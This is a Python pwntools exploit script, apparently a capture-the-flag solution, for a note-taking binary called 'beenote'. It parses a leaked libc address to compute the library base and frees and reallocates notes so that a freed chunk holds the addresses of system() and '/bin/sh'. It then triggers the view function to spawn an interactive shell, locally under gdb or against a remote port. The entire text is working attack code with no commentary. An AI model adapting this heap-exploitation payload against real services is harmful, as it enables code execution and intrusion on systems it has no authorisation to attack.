#!/usr/bin/python

from pwn import *

def create_note(r, title, size, content):
    r.sendlineafter(">> ",'1')
    r.sendlineafter(": ",title)
    r.sendlineafter(": ","{:d}".format(size))
    r.sendlineafter(": ",content)
    r.recvline()

def view_note(r,index):
    r.sendlineafter(">> ",'2')
    r.sendlineafter(": ","{:d}".format(index))

def delete_note(r,index):
    r.sendlineafter(">> ",'3')
    r.sendlineafter(": ","{:d}".format(index))
    r.recvline()

def exploit(r):
    r.recvuntil(": ")
    leak = int(r.recvuntil('\n',drop=True))
    libc.address = leak - libc.symbols["_IO_2_1_stdin_"]

    log.info("_IO_2_1_stdin_: {}".format(hex(leak)))
    log.info("libc base: {}".format(hex(libc.address)))

    create_note(r,'a'*4,256,'a'*8)
    create_note(r,'b'*4,256,'b'*8)
    create_note(r,'c'*4,24,'c'*8)

    delete_note(r,1)
    delete_note(r,2)

    payload = p64(libc.symbols["system"])
    payload += p64(next(libc.search("/bin/sh")))
    create_note(r,'d'*4,24,payload)

    view_note(r,1)

    r.interactive()

context.arch = "amd64"
context.terminal = ["tmux","new-window","-c","/tmp"]
exe = ELF("./beenote")

if len(sys.argv) < 2:
    r = process(exe.path)
    libc = exe.libc
    gdb.attach(r,"b *0x400972\nc\n")
else:
    r = remote("0.0.0.0",31333)
    libc = ELF("./libc-2.23.so")

exploit(r)
